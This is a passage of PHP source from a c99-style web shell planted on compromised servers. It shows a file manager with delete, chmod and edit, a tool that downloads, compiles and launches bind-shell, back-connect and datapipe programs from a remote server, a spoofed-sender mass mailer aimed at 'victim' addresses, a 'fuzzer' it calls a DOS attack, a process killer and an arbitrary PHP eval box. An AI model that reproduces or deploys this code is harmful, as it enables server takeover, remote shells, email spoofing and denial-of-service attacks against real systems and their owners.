			while (($o = readdir($h)) !== FALSE) {$list[] = $d.$o;}
			closedir($h);
			}
			else {}
		}
		if (count($list) == 0) {echo "<center><b>Can't open folder (".htmlspecialchars($d).")!</b></center>";}
		else
		{
			//Building array
			$objects = array();
			$vd = "f"; //Viewing mode
			if ($vd == "f")
			{
				$objects["head"] = array();
				$objects["folders"] = array();
				$objects["links"] = array();
				$objects["files"] = array();
				foreach ($list as $v)
				{
					$o = basename($v);
					$row = array();
					if ($o == ".") {$row[] = $d.$o; $row[] = "LINK";}
					elseif ($o == "..") {$row[] = $d.$o; $row[] = "LINK";}
					elseif (is_dir($v))
					{
						if (is_link($v)) {$type = "LINK";}
						else {$type = "DIR";}
						$row[] = $v;
						$row[] = $type;
					}
					elseif(is_file($v)) {$row[] = $v; $row[] = filesize($v);}
					$row[] = filemtime($v);
					if (!$win)
					{
						$ow = posix_getpwuid(fileowner($v));
						$gr = posix_getgrgid(filegroup($v));
						$row[] = ($ow["name"]?$ow["name"]:fileowner($v))."/".($gr["name"]?$gr["name"]:filegroup($v));
					}
					$row[] = fileperms($v);
					if (($o == ".") or ($o == "..")) {$objects["head"][] = $row;}
					elseif (is_link($v)) {$objects["links"][] = $row;}
					elseif (is_dir($v)) {$objects["folders"][] = $row;}
					elseif (is_file($v)) {$objects["files"][] = $row;}
					$i++;
				}
				$row = array();
				$row[] = "<b>Name</b>";
				$row[] = "<b>Size</b>";
				$row[] = "<b>Modify</b>";
				if (!$win) {$row[] = "<b>Owner/Group</b>";}
				$row[] = "<b>Perms</b>";
				$row[] = "<b>Action</b>";
				$parsesort = parsesort($sort);
				$sort = $parsesort[0].$parsesort[1];
				$k = $parsesort[0];
				if ($parsesort[1] != "a") 
				{
					$parsesort[1] = "d";	 
					$y = " | <a href=\"".$surl."act=".$dspact."&d=".urlencode($d)."&sort=".$k.($parsesort[1] == "a"?"d":"a")."\">";
					$y .= " Desc </a>";
				}
				else
				{
					$y = " | <a href=\"".$surl."act=".$dspact."&d=".urlencode($d)."&sort=".$k.($parsesort[1] == "a"?"d":"a")."\">";
					$y .= " Asc </a>";
				}
				$row[$k] .= $y;
				for($i=0;$i<count($row)-1;$i++)
				{
					if ($i != $k) {$row[$i] = "<a href=\"".$surl."act=".$dspact."&d=".urlencode($d)."&sort=".$i.$parsesort[1]."\">".$row[$i]."</a>";}
				}
				$v = $parsesort[0];
				usort($objects["folders"], "tabsort");
				usort($objects["links"], "tabsort");
				usort($objects["files"], "tabsort");
				if ($parsesort[1] == "d")
				{
					$objects["folders"] = array_reverse($objects["folders"]);
					$objects["files"] = array_reverse($objects["files"]);
				}
				$objects = array_merge($objects["head"],$objects["folders"],$objects["links"],$objects["files"]);
				$tab = array();
				$tab["cols"] = array($row);
				$tab["head"] = array();
				$tab["folders"] = array();
				$tab["links"] = array();
				$tab["files"] = array();
				$i = 0;
				foreach ($objects as $a)
				{
					$v = $a[0];
					$o = basename($v);
					$dir = dirname($v);
					if ($disp_fullpath) {$disppath = $v;}
					else {$disppath = $o;}
					$disppath = str2mini($disppath,60);
					if (in_array($v,$sess_data["cut"])) {$disppath = "<strike>".$disppath."</strike>";}
					elseif (in_array($v,$sess_data["copy"])) {$disppath = "<u>".$disppath."</u>";}
					foreach ($regxp_highlight as $r)
					{
						if (ereg($r[0],$o))
						{
							if ((!is_numeric($r[1])) or ($r[1] > 3)) {$r[1] = 0; ob_clean(); echo "Warning! Configuration error in \$regxp_highlight[".$k."][0] - unknown command."; c99shexit();}
							else
							{
								$r[1] = round($r[1]);
								$isdir = is_dir($v);
								if (($r[1] == 0) or (($r[1] == 1) and !$isdir) or (($r[1] == 2) and !$isdir))
								{
									if (empty($r[2])) {$r[2] = "<b>"; $r[3] = "</b>";}
									$disppath = $r[2].$disppath.$r[3];
									if ($r[4]) {break;}
								}
							}
						}
					}
					$uo = urlencode($o);
					$ud = urlencode($dir);
					$uv = urlencode($v);
					$row = array();
					if ($o == ".")
					{
						$row[] = "<font face=wingdings size=+1>1</font> <a href=\"".$surl."act=".$dspact."&d=".urlencode(realpath($d.$o))."&sort=".$sort."\">".$o."</a>";
						$row[] = "LINK";
					}
					elseif ($o == "..")
					{
						$row[] = "<font face=wingdings size=+1>1</font> <a href=\"".$surl."act=".$dspact."&d=".urlencode(realpath($d.$o))."&sort=".$sort."\">".$o."</a>";
						$row[] = "LINK";
					}
					elseif (is_dir($v))
					{
						if (is_link($v))
						{
							$disppath .= " => ".readlink($v);
							$type = "LINK";
							$row[] =  "<font face=wingdings size=+1>1</font> <a href=\"".$surl."act=ls&d=".$uv."&sort=".$sort."\">[".$disppath."]</a>";
						}
						else
						{
							$type = "DIR";
							$row[] =  "<font face=wingdings size=+1>1</font> <a href=\"".$surl."act=ls&d=".$uv."&sort=".$sort."\">[".$disppath."]</a>";
						}
						$row[] = $type;
					}
					elseif(is_file($v))
					{
						$ext = explode(".",$o);
						$c = count($ext)-1;
						$ext = $ext[$c];
						$ext = strtolower($ext);
						$row[] =  "<font face=wingdings size=+2>2</font> <a href=\"".$surl."act=f&f=".$uo."&d=".$ud."&\">".$disppath."</a>";
						$row[] = view_size($a[1]);
					}
					$row[] = date("d.m.Y H:i:s",$a[2]);
					if (!$win) {$row[] = $a[3];}
					$row[] = "<a href=\"".$surl."act=chmod&f=".$uo."&d=".$ud."\"><b>".view_perms_color($v)."</b></a>";
					if ($o == ".") {$checkbox = "<input type=\"checkbox\" name=\"actbox[]\" onclick=\"ls_reverse_all();\">"; $i--;}
					else {$checkbox = "<input type=\"checkbox\" name=\"actbox[]\" id=\"actbox".$i."\" value=\"".htmlspecialchars($v)."\">";}
					if (is_dir($v)) {$row[] = "<a href=\"".$surl."act=d&d=".$uv."\">Info</a> ".$checkbox;}
					else {$row[] = "<a href=\"".$surl."act=f&f=".$uo."&ft=info&d=".$ud."\">Info</a> | 
					<a href=\"".$surl."act=f&f=".$uo."&ft=edit&d=".$ud."\">Edit</a> | 
					<a href=\"".$surl."act=f&f=".$uo."&ft=download&d=".$ud."\">Download</a> ".$checkbox;}
					if (($o == ".") or ($o == "..")) {$tab["head"][] = $row;}
					elseif (is_link($v)) {$tab["links"][] = $row;}
					elseif (is_dir($v)) {$tab["folders"][] = $row;}
					elseif (is_file($v)) {$tab["files"][] = $row;}
					$i++;
				}
			}
			// Compiling table
			$table = array_merge($tab["cols"],$tab["head"],$tab["folders"],$tab["links"],$tab["files"]);
			echo "<center><b>Listing folder (".count($tab["files"])." files and ".(count($tab["folders"])+count($tab["links"]))." folders):</b></center><br>
			<TABLE cellSpacing=0 cellPadding=0 width=100%  borderColorLight=#433333 border=0>
			<form action=\"".$surl."\" method=POST name=\"ls_form\">
			<input type=hidden name=act value=".$dspact."><input type=hidden name=d value=".$d.">";
			foreach($table as $row)
			{
				echo "<tr>\r\n";
				foreach($row as $v) {echo "<td>".$v."</td>\r\n";}
				echo "</tr>\r\n";
			}
			echo "</table><hr size=\"1\" noshade><p align=\"right\">
			<script>
			function ls_setcheckboxall(status)
			{
				var id = 1;
				var num = ".(count($table)-2).";
				while (id <= num)
				{
					document.getElementById('actbox'+id).checked = status;
					id++;
				}
			}
			function ls_reverse_all()
			{
				var id = 1;
				var num = ".(count($table)-2).";
				while (id <= num)
				{
					document.getElementById('actbox'+id).checked = !document.getElementById('actbox'+id).checked;
					id++;
				}
			}
			</script>
			<input type=\"button\" onclick=\"ls_setcheckboxall(true);\" value=\"Select all\"> <input type=\"button\" onclick=\"ls_setcheckboxall(false);\" value=\"Unselect all\"> 
			<b>-^^-";
			if (count(array_merge($sess_data["copy"],$sess_data["cut"])) > 0 and ($usefsbuff))
			{
			echo "<input type=submit name=actarcbuff value=\"Pack buffer to archive\"> 
			<input type=\"text\" name=\"actarcbuff_path\" value=\"archive_".substr(md5(rand(1,1000).rand(1,1000)),0,5).".tar.gz\">  
			<input type=submit name=\"actpastebuff\" value=\"Paste\">  
			<input type=submit name=\"actemptybuff\" value=\"Empty buffer\">  ";
			}
			echo "<select name=act><option value=\"".$act."\">With selected:</option>";
			echo "<option value=delete".($dspact == "delete"?" selected":"").">Delete</option>";
			echo "<option value=chmod".($dspact == "chmod"?" selected":"").">Change-mode</option>";
			if ($usefsbuff)
			{
				echo "<option value=cut".($dspact == "cut"?" selected":"").">Cut</option>";
				echo "<option value=copy".($dspact == "copy"?" selected":"").">Copy</option>";
				echo "<option value=unselect".($dspact == "unselect"?" selected":"").">Unselect</option>";
			}
			echo "</select> <input type=submit value=\"Confirm\"></p>";
			echo "</form>";
		}
	}
	if ($act == "tools")
	{
		$bndportsrcs = array(
			"c99sh_bindport.pl"=>array("Using PERL","perl %path %port"),
			"c99sh_bindport.c"=>array("Using C","%path %port %pass")
		);
		$bcsrcs = array(
			"c99sh_backconn.pl"=>array("Using PERL","perl %path %host %port"),
			"c99sh_backconn.c"=>array("Using C","%path %host %port")
		);
		$dpsrcs = array(
			"c99sh_datapipe.pl"=>array("Using PERL","perl %path %localport %remotehost %remoteport"),
			"c99sh_datapipe.c"=>array("Using C","%path %localport %remoteport %remotehost")
		);
		if (!is_array($bind)) {$bind = array();}
		if (!is_array($bc)) {$bc = array();}
		if (!is_array($datapipe)) {$datapipe = array();}	 
		if (!is_numeric($bind["port"])) {$bind["port"] = $bindport_port;}
		if (empty($bind["pass"])) {$bind["pass"] = $bindport_pass;}  
		if (empty($bc["host"])) {$bc["host"] = getenv("REMOTE_ADDR");}
		if (!is_numeric($bc["port"])) {$bc["port"] = $bc_port;}	 
		if (empty($datapipe["remoteaddr"])) {$datapipe["remoteaddr"] = "irc.dalnet.ru:6667";}
		if (!is_numeric($datapipe["localport"])) {$datapipe["localport"] = $datapipe_localport;}
		if (!empty($bindsubmit))
		{
			echo "<b>Result of binding port:</b><br>";
			$v = $bndportsrcs[$bind["src"]];
			if (empty($v)) {echo "Unknown file!<br>";}
			elseif (fsockopen(getenv("SERVER_ADDR"),$bind["port"],$errno,$errstr,0.1)) {echo "Port al#ff0000y in use, select any other!<br>";}
			else
			{
				$w = explode(".",$bind["src"]);
				$ext = $w[count($w)-1];
				unset($w[count($w)-1]);
				$srcpath = join(".",$w).".".rand(0,999).".".$ext;
				$binpath = $tmpdir.join(".",$w).rand(0,999);
				if ($ext == "pl") {$binpath = $srcpath;}
				@unlink($srcpath);
				$fp = fopen($srcpath,"ab+");
				if (!$fp) {echo "Can't write sources to \"".$srcpath."\"!<br>";}
				elseif (!$data = c99getsource($bind["src"])) {echo "Can't download sources!";}
				else
				{
					fwrite($fp,$data,strlen($data));
					fclose($fp);
					if ($ext == "c") {$retgcc = myshellexec("gcc -o ".$binpath." ".$srcpath);  @unlink($srcpath);}
					$v[1] = str_replace("%path",$binpath,$v[1]);
					$v[1] = str_replace("%port",$bind["port"],$v[1]);
					$v[1] = str_replace("%pass",$bind["pass"],$v[1]);
					$v[1] = str_replace("//","/",$v[1]);
					$retbind = myshellexec($v[1]." > /dev/null &");
					sleep(5);
					$sock = fsockopen("localhost",$bind["port"],$errno,$errstr,5);
					if (!$sock) {echo "I can't connect to localhost:".$bind["port"]."! I think you should configure your firewall.";}
					else {echo "Binding... ok! Connect to <b>".getenv("SERVER_ADDR").":".$bind["port"]."</b>! 
					You should use NetCat&copy;, run \"<b>nc -v ".getenv("SERVER_ADDR")." ".$bind["port"]."</b>\"!<center>
					<a href=\"".$surl."act=processes&grep=".basename($binpath)."\"><u>View binder's process</u></a></center>";}
				}
				echo "<br>";
			}
		}
		if (!empty($bcsubmit))
		{
			echo "<b>Result of back connection:</b><br>";
			$v = $bcsrcs[$bc["src"]];
			if (empty($v)) {echo "Unknown file!<br>";}
			else
			{
				$w = explode(".",$bc["src"]);
				$ext = $w[count($w)-1];
				unset($w[count($w)-1]);
				$srcpath = join(".",$w).".".rand(0,999).".".$ext;
				$binpath = $tmpdir.join(".",$w).rand(0,999);
				if ($ext == "pl") {$binpath = $srcpath;}
				@unlink($srcpath);
				$fp = fopen($srcpath,"ab+");
				if (!$fp) {echo "Can't write sources to \"".$srcpath."\"!<br>";}
				elseif (!$data = c99getsource($bc["src"])) {echo "Can't download sources!";}
				else
				{
					fwrite($fp,$data,strlen($data));
					fclose($fp);
					if ($ext == "c") {$retgcc = myshellexec("gcc -o ".$binpath." ".$srcpath); @unlink($srcpath);}
					$v[1] = str_replace("%path",$binpath,$v[1]);
					$v[1] = str_replace("%host",$bc["host"],$v[1]);
					$v[1] = str_replace("%port",$bc["port"],$v[1]);
					$v[1] = str_replace("//","/",$v[1]);
					$retbind = myshellexec($v[1]." > /dev/null &");
					echo "Now script try connect to ".htmlspecialchars($bc["host"]).":".htmlspecialchars($bc["port"])."...<br>";
				}
			}
		}
		if (!empty($dpsubmit))
		{
			echo "<b>Result of datapipe-running:</b><br>";
			$v = $dpsrcs[$datapipe["src"]];
			if (empty($v)) {echo "Unknown file!<br>";}
			elseif (fsockopen(getenv("SERVER_ADDR"),$datapipe["port"],$errno,$errstr,0.1)) 
			{
				echo "Port already in use, select any other!<br>";
			}
			else
			{
				$srcpath = $tmpdir.$datapipe["src"];
				$w = explode(".",$datapipe["src"]);
				$ext = $w[count($w)-1];
				unset($w[count($w)-1]);
				$srcpath = join(".",$w).".".rand(0,999).".".$ext;
				$binpath = $tmpdir.join(".",$w).rand(0,999);
				if ($ext == "pl") {$binpath = $srcpath;}
				@unlink($srcpath);
				$fp = fopen($srcpath,"ab+");
				if (!$fp) {echo "Can't write sources to \"".$srcpath."\"!<br>";}
				elseif (!$data = c99getsource($datapipe["src"])) {echo "Can't download sources!";}
				else
				{
					fwrite($fp,$data,strlen($data));
					fclose($fp);
					if ($ext == "c") {$retgcc = myshellexec("gcc -o ".$binpath." ".$srcpath); @unlink($srcpath);}
					list($datapipe["remotehost"],$datapipe["remoteport"]) = explode(":",$datapipe["remoteaddr"]);
					$v[1] = str_replace("%path",$binpath,$v[1]);
					$v[1] = str_replace("%localport",$datapipe["localport"],$v[1]);
					$v[1] = str_replace("%remotehost",$datapipe["remotehost"],$v[1]);
					$v[1] = str_replace("%remoteport",$datapipe["remoteport"],$v[1]);
					$v[1] = str_replace("//","/",$v[1]);
					$retbind = myshellexec($v[1]." > /dev/null &");
					sleep(5);
					$sock = fsockopen("localhost",$datapipe["port"],$errno,$errstr,5);
					if (!$sock) {echo "I can't connect to localhost:".$datapipe["localport"]."! I think you should configure your firewall.";}
					else {echo "Running datapipe... ok! Connect to 
					<b>".getenv("SERVER_ADDR").":".$datapipe["port"].", and you will connected to ".$datapipe["remoteaddr"]."</b>! 
					You should use NetCat&copy;, run \"<b>nc -v ".getenv("SERVER_ADDR")." ".$bind["port"]."</b>\"!<center>
					<a href=\"".$surl."act=processes&grep=".basename($binpath)."\"><u>View datapipe process</u></a></center>";}
				}
				echo "<br>";
			}
		}
		?>
		<b>Binding port:</b><br><form action="<?php echo $surl; ?>"><input type=hidden name=act value=tools>
		<input type=hidden name=d value="<?php echo $d; ?>">Port: <input type=text name="bind[port]" value="<?php echo htmlspecialchars($bind["port"]); ?>"> 
		Password: <input type=text name="bind[pass]" value="<?php echo htmlspecialchars($bind["pass"]); ?>"> <select name="bind[src]"><?php
		foreach($bndportsrcs as $k=>$v) {echo "<option value=\"".$k."\""; if ($k == $bind["src"]) {echo " selected";} echo ">".$v[0]."</option>";}
		?></select> 
		<input type=submit name=bindsubmit value="Bind"></form>
		<b>Back connection:</b><br><form action="<?php echo $surl; ?>"><input type=hidden name=act value=tools><input type=hidden name=d value="<?php echo $d; ?>">
		HOST: <input type=text name="bc[host]" value="<?php echo htmlspecialchars($bc["host"]); ?>"> 
		Port: <input type=text name="bc[port]" value="<?php echo htmlspecialchars($bc["port"]); ?>"> <select name="bc[src]"><?php
		foreach($bcsrcs as $k=>$v) {echo "<option value=\"".$k."\""; if ($k == $bc["src"]) {echo " selected";} echo ">".$v[0]."</option>";}
		?></select> 
		<input type=submit name=bcsubmit value="Connect"></form>
		Click "Connect" only after open port for it. You should use NetCat&copy;, run "<b>nc -l -n -v -p <?php echo $bc_port; ?></b>"!<br><br>
		<b>Datapipe:</b><br><form action="<?php echo $surl; ?>"><input type=hidden name=act value=tools><input type=hidden name=d value="<?php echo $d; ?>">
		HOST: <input type=text name="datapipe[remoteaddr]" value="<?php echo htmlspecialchars($datapipe["remoteaddr"]); ?>"> 
		Local port: <input type=text name="datapipe[localport]" value="<?php echo htmlspecialchars($datapipe["localport"]); ?>"> <select name="datapipe[src]"><?php
		foreach($dpsrcs as $k=>$v) {echo "<option value=\"".$k."\""; if ($k == $bc["src"]) {echo " selected";} echo ">".$v[0]."</option>";}
		?></select> <input type=submit name=dpsubmit value="Run"></form>
		<b>Note:</b> sources will be downloaded from remote server.
		
		<?php
	}
	
	
	//Mass Mailer

if($act== "mail")
{
    if(
        isset($_GET['to']) &&
        isset($_GET['from']) &&
        isset($_GET['subject']) &&
        isset($_GET['message'])
    )
    {

        mail($_GET['to'],$_GET['subject'],$_GET['message'],"From:".$_GET['from']);
    }
    else
    {
        ?>
        <form method="GET">
            <input type="hidden" name="mail" />
            <table id="margins">
                <tr>
                    <td width="100" class="title">
                        From
                    </td>
                    <td>
                        <input class="cmd" name="from" value="president@whitehouse.gov" onFocus="if(this.value == 'president@whitehouse.gov')this.value = '';" onBlur="if(this.value=='')this.value='president@whitehouse.gov';"/>
                    </td>
                </tr>
                
                <tr>
                    <td class="title">
                        To 
                    </td>
                    <td>
                        <input class="cmd" name="to" value="victim@domain.com,victim2@domain.com" onFocus="if(this.value == 'victim@domain.com,victim2@domain.com')this.value = '';" onBlur="if(this.value=='')this.value='victim@domain.com,victim2@domain.com';"/>
                    </td>
                </tr>
                
                <tr>
                    <td class="title">
                        Subject
                    </td>
                    <td>
                        <input type="text" class="cmd" name="subject" value="Just testing my Fucking Skillz!" onFocus="if(this.value == 'Just testing my Fucking Skillz!')this.value = '';" onBlur="if(this.value=='')this.value='Just testing my Fucking Skillz!';" />
                    </td>
                </tr>
                
                
                <tr>
                    <td colspan="2">
                        <textarea name="message" cols="173" rows="10" class="cmd">All i remember are those lonely nights when i was defacing those insecure websites!</textarea>
                    </td>
                </tr>
                
                
                <tr>
                    <td rowspan="2">
                        <input style="margin : 20px; margin-left: 390px; padding : 10px; width: 100px;" type="submit" class="own" value="Send! :D"/>
                    </td>
                </tr>
            </table>            
        </form>   
        <?php
    }
}


	
	//fuzzer

if($act== "fuzz")
{
    if(isset($_GET['ip']) &&
    isset($_GET['port']) &&
    isset($_GET['times']) &&
    isset($_GET['time']) &&
    isset($_GET['message']) &&
    isset($_GET['messageMultiplier']) &&
    $_GET['message'] != "" &&
    $_GET['time'] != "" &&
    $_GET['times'] != "" &&
    $_GET['port'] != "" &&
    $_GET['ip'] != "" &&
    $_GET['messageMultiplier'] != ""
    )
    {
       $IP=$_GET['ip'];
	   $port=$_GET['port'];
       $times = $_GET['times'];
	   $timeout = $_GET['time'];
	   $send = 0;
       $ending = "";
       $multiplier = $_GET['messageMultiplier'];
       $data = "";
       $mode="tcp";
       $data .= "GET /";
       $ending .= " HTTP/1.1\n\r\n\r\n\r\n\r";
        if($_GET['type'] == "tcp")
        {
            $mode = "tcp";
        }
        while($multiplier--)
        {
            $data .= urlencode($_GET['message']);
        }
        $data .= "%s%s%s%s%d%x%c%n%n%n%n";// add some format string specifiers
        $data .= "by-Ani-shell".$ending;
        $length = strlen($data);
        
        
       echo "Sending Data :- <br /> <p align='center'>$data</p>";
        
       print "I am at ma Work now :D ;D! Dont close this window untill you recieve a message <br>";
	   for($i=0;$i<$times;$i++)
	   {
            $socket = fsockopen("$mode://$IP", $port, $error, $errorString, $timeout);
            if($socket)
            {
                fwrite($socket , $data , $length );
                fclose($socket);
            }
        }
        echo "<script>alert('Fuzzing Completed!');</script>";
        echo "DOS attack against $mode://$IP:$port completed on ".date("h:i:s A")."<br />";
        echo "Total Number of Packets Sent : " . $times . "<br />";
        echo "Total Data Sent = ". HumanReadableFilesize($times*$length) . "<br />"; 
        echo "Data per packet = " . HumanReadableFilesize($length) . "<br />";
    }
    else
    {
        ?>
        <form method="GET">
            <input type="hidden" name="fuzz" />
            <table id="margins">
                <tr>
                    <td width="400" class="title">
                        IP
                    </td>
                    <td>
                        <input class="cmd" name="ip" value="127.0.0.1" onFocus="if(this.value == '127.0.0.1')this.value = '';" onBlur="if(this.value=='')this.value='127.0.0.1';"/>
                    </td>
                </tr>
                
                <tr>
                    <td class="title">
                        Port
                    </td>
                    <td>
                        <input class="cmd" name="port" value="80" onFocus="if(this.value == '80')this.value = '';" onBlur="if(this.value=='')this.value='80';"/>
                    </td>
                </tr>
                
                <tr>
                    <td class="title">
                        Timeout
                    </td>
                    <td>
                        <input type="text" class="cmd" name="time" value="5" onFocus="if(this.value == '5')this.value = '';" onBlur="if(this.value=='')this.value='5';"/>
                    </td>
                </tr>
                
                
                <tr>
                    <td class="title">
                        No of times
                    </td>
                    <td>
                        <input type="text" class="cmd" name="times" value="100" onFocus="if(this.value == '100')this.value = '';" onBlur="if(this.value=='')this.value='100';" />
                    </td>
                </tr>
                
                <tr>
                    <td class="title">
                        Message <font color="red">(The message Should be long and it will be multiplied with the value after it)</font>
                    </td>
                    <td>
                        <input class="cmd" name="message" value="%S%x--Some Garbage here --%x%S" onFocus="if(this.value == '%S%x--Some Garbage here --%x%S')this.value = '';" onBlur="if(this.value=='')this.value='%S%x--Some Garbage here --%x%S';"/>
                    </td>
                    <td>
                        x
                    </td>
                    <td width="20">
                        <input style="width: 30px;" class="cmd" name="messageMultiplier" value="10" />
                    </td>
                </tr>
                
                <tr>
                    <td rowspan="2">
                        <input style="margin : 20px; margin-left: 500px; padding : 10px; width: 100px;" type="submit" class="own" value="Let it Rip! :D"/>
                    </td>
                </tr>
            </table>            
        </form>
        <?php
    }
}


	
	if ($act == "processes")
	{
		echo "<b>Proses:</b><br>";
		if (!$win) {$handler = "ps -aux".($grep?" | grep '".addslashes($grep)."'":"");}
		else {$handler = "tasklist";}
		$ret = myshellexec($handler);
		if (!$ret) {echo "Ga bisa mengeksekusi \"".$handler."\"!";}
		else
		{
			if (empty($processes_sort)) {$processes_sort = $sort_default;}
			$parsesort = parsesort($processes_sort);
			if (!is_numeric($parsesort[0])) {$parsesort[0] = 0;}
			$k = $parsesort[0];
			if ($parsesort[1] != "a") {$y = " | <a href=\"".$surl."act=".$dspact."&d=".urlencode($d)."&processes_sort=".$k."a\">Desc</a>";}
			else {$y = " | <a href=\"".$surl."act=".$dspact."&d=".urlencode($d)."&processes_sort=".$k."d\">Asc</a>";}
			$ret = htmlspecialchars($ret);
			if (!$win)
			{
				if ($pid)
				{
					if (is_null($sig)) {$sig = 9;}
					echo "Sending signal ".$sig." to #".$pid."... ";
					if (posix_kill($pid,$sig)) {echo "OK.";}
					else {echo "ERROR.";}
				}
				while (ereg("  ",$ret)) {$ret = str_replace("  "," ",$ret);}
				$stack = explode("\n",$ret);
				$head = explode(" ",$stack[0]);
				unset($stack[0]);
				for($i=0;$i<count($head);$i++)
				{
					if ($i != $k) {$head[$i] = "<a href=\"".$surl."act=".$dspact."&d=".urlencode($d)."&processes_sort=".$i.$parsesort[1]."\"><b>".$head[$i]."</b></a>";}
				}
				$prcs = array();
				foreach ($stack as $line)
				{
					if (!empty($line))
					{
						echo "<tr>";
						$line = explode(" ",$line);
						$line[10] = join(" ",array_slice($line,10));
						$line = array_slice($line,0,11);
						if ($line[0] == get_current_user()) {$line[0] = "<font color=#00ff00>".$line[0]."</font>";}
						$line[] = "<a href=\"".$surl."act=processes&d=".urlencode($d)."&pid=".$line[1]."&sig=9\"><u>KILL</u></a>";
						$prcs[] = $line;
						echo "</tr>";
					}
				}
			}
			else
			{
				while (ereg("  ",$ret)) {$ret = str_replace("  ","	",$ret);}
				while (ereg("  ",$ret)) {$ret = str_replace("  ","	",$ret);}
				while (ereg("  ",$ret)) {$ret = str_replace("  ","	",$ret);}
				while (ereg("  ",$ret)) {$ret = str_replace("  ","	",$ret);}
				while (ereg("  ",$ret)) {$ret = str_replace("  ","	",$ret);}
				while (ereg("  ",$ret)) {$ret = str_replace("  ","	",$ret);}
				while (ereg("  ",$ret)) {$ret = str_replace("  ","	",$ret);}
				while (ereg("  ",$ret)) {$ret = str_replace("  ","	",$ret);}
				while (ereg("  ",$ret)) {$ret = str_replace("  ","	",$ret);}
				while (ereg("		",$ret)) {$ret = str_replace("		","	",$ret);}
				while (ereg("	 ",$ret)) {$ret = str_replace("	 ","	",$ret);}
				$ret = convert_cyr_string($ret,"d","w");
				$stack = explode("\n",$ret);
				unset($stack[0],$stack[2]);
				$stack = array_values($stack);
				$head = explode("	",$stack[0]);
				$head[1] = explode(" ",$head[1]);
				$head[1] = $head[1][0];
				$stack = array_slice($stack,1);
				unset($head[2]);
				$head = array_values($head);
				if ($parsesort[1] != "a") {$y = " | <a href=\"".$surl."act=".$dspact."&d=".urlencode($d)."&processes_sort=".$k."a\">Desc</a>";}
				else {$y = " | <a href=\"".$surl."act=".$dspact."&d=".urlencode($d)."&processes_sort=".$k."d\">Asc</a>";}
				if ($k > count($head)) {$k = count($head)-1;}
				for($i=0;$i<count($head);$i++)
				{
					if ($i != $k) {$head[$i] = "<a href=\"".$surl."act=".$dspact."&d=".urlencode($d)."&processes_sort=".$i.$parsesort[1]."\"><b>".trim($head[$i])."</b></a>";}
				}
				$prcs = array();
				foreach ($stack as $line)
				{
					if (!empty($line))
					{
						echo "<tr>";
						$line = explode("	",$line);
						$line[1] = intval($line[1]); $line[2] = $line[3]; unset($line[3]);
						$line[2] = intval(str_replace(" ","",$line[2]))*1024; 
						$prcs[] = $line;
						echo "</tr>";
					}
				}
			}
			$head[$k] = "<b>".$head[$k]."</b>".$y;
			$v = $processes_sort[0];
			usort($prcs,"tabsort");
			if ($processes_sort[1] == "d") {$prcs = array_reverse($prcs);}
			$tab = array();
			$tab[] = $head;
			$tab = array_merge($tab,$prcs);
			echo "<TABLE height=1 cellSpacing=0 cellPadding=5 border=1 width=95%>";
			foreach($tab as $i=>$k)
			{
				echo "<tr>";
				foreach($k as $j=>$v) {if ($win and $i > 0 and $j == 2) {$v = view_size($v);} echo "<td>".$v."</td>";}
				echo "</tr>";
			}
			echo "</table>";
		}
	}
	if ($act == "eval")
	{
	 if (!empty($eval))
		{
			echo "<b>Result of execution this PHP-code</b>:<br>";
			$tmp = ob_get_contents();
			$olddir = realpath(".");
			@chdir($d);
			if ($tmp)
			{
				ob_clean();
				eval($eval);
				$ret = ob_get_contents();
				$ret = convert_cyr_string($ret,"d","w");
				ob_clean();
				echo $tmp;
				if ($eval_txt)
				{
					$rows = count(explode("\r\n",$ret))+1;
					if ($rows < 10) {$rows = 10;}
					echo "<br><textarea cols=\"122\" rows=\"".$rows."\" readonly>".htmlspecialchars($ret)."</textarea>";
				}
				else {echo $ret."<br>";}
			}
			else
			{
				if ($eval_txt)
				{
					echo "<br><textarea cols=\"122\" rows=\"15\" readonly>";
					eval($eval);
					echo "</textarea>";
				}
				else {echo $ret;}
			}
			@chdir($olddir);
		}
		else {echo "<b>Execution PHP-code</b>"; if (empty($eval_txt)) {$eval_txt = TRUE;}}
		echo "<form action=\"".$surl."\" method=POST>
		<input type=hidden name=act value=eval>
		<textarea name=\"eval\" cols=\"122\" rows=\"10\">".htmlspecialchars($eval)."</textarea>
		<input type=hidden name=\"d\" value=\"".$dispd."\"><br><br>
		<input type=submit value=\"Execute\"> 
		Display in text-area <input type=\"checkbox\" name=\"eval_txt\" value=\"1\""; 
		if ($eval_txt) {echo " checked";} echo "></form>";
	}
	if ($act == "f")
	{
		if ((!is_readable($d.$f) or is_dir($d.$f)) and $ft != "edit")
		{
			if (file_exists($d.$f)) {echo "<center><b>Permision denied (".htmlspecialchars($d.$f).")!</b></center>";}
			else {echo "<center><b>File does not exists (".htmlspecialchars($d.$f).")!</b><br>
			<a href=\"".$surl."act=f&f=".urlencode($f)."&ft=edit&d=".urlencode($d)."&c=1\"><u>Create</u></a></center>";}
		}
		else
		{
			$r = @file_get_contents($d.$f);
			$ext = explode(".",$f);
			$c = count($ext)-1;
			$ext = $ext[$c];
			$ext = strtolower($ext);
			$rft = "";
			foreach($ftypes as $k=>$v) {if (in_array($ext,$v)) {$rft = $k; break;}}
			if (eregi("sess_(.*)",$f)) {$rft = "phpsess";}
			if (empty($ft)) {$ft = $rft;}
			$arr = array(
				array("Info","info"),
				array("HTML","html"),
				array("TXT","txt"),
				array("Code","code"),
				array("Session","phpsess"),
				array("EXE","exe"),
				array("SDB","sdb"),
				array("IMG","img"),
				array("INI","ini"),
				array("Download","download"),
				array("Notepad","notepad"),
				array("Edit","edit")
			);
			echo "<b>Viewing file: <font color=#00ff00>[ ".$ext." format ]</font> =&gt; ".$f." (".view_size(filesize($d.$f)).")   ".view_perms_color($d.$f)."</b><br>Select action/file-type:<br>";
			foreach($arr as $t)
			{
				if ($t[1] == $rft) {echo " <a href=\"".$surl."act=f&f=".urlencode($f)."&ft=".$t[1]."&d=".urlencode($d)."\"><font color=#00ff00>".$t[0]."</font></a>";}
				elseif ($t[1] == $ft) {echo " <a href=\"".$surl."act=f&f=".urlencode($f)."&ft=".$t[1]."&d=".urlencode($d)."\"><b><u>".$t[0]."</u></b></a>";}
				else {echo " <a href=\"".$surl."act=f&f=".urlencode($f)."&ft=".$t[1]."&d=".urlencode($d)."\"><b>".$t[0]."</b></a>";}
				echo " (<a href=\"".$surl."act=f&f=".urlencode($f)."&ft=".$t[1]."&white=1&d=".urlencode($d)."\" target=\"_blank\">+</a>) |";
			}
			echo "<hr size=\"1\" noshade>";
			if ($ft == "info")
			{
				echo "<b>Information:</b><table border=0 cellspacing=1 cellpadding=2><tr>
				<td><b>Path</b></td><td> ".$d.$f."</td></tr><tr><td><b>Size</b></td>
